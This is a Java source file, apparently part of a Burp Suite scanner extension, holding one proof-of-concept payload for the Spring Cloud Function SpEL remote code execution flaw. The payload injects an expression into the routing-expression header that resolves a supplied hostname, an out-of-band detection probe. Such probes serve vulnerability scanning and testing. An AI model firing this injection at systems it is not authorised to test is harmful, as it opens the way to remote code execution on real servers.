package burp.payload.pocs;

import burp.payload.IPoc;

/**
 * @author : metaStor
 * @date : Created 2022/4/9 10:04 PM
 * @description: Spring-Cloud-Function SpEL RCE
 * Check POC
 */
public class POC4 implements IPoc {

    @Override
    public String genPoc() {
        return "spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName(\"%s\")";
    }
}
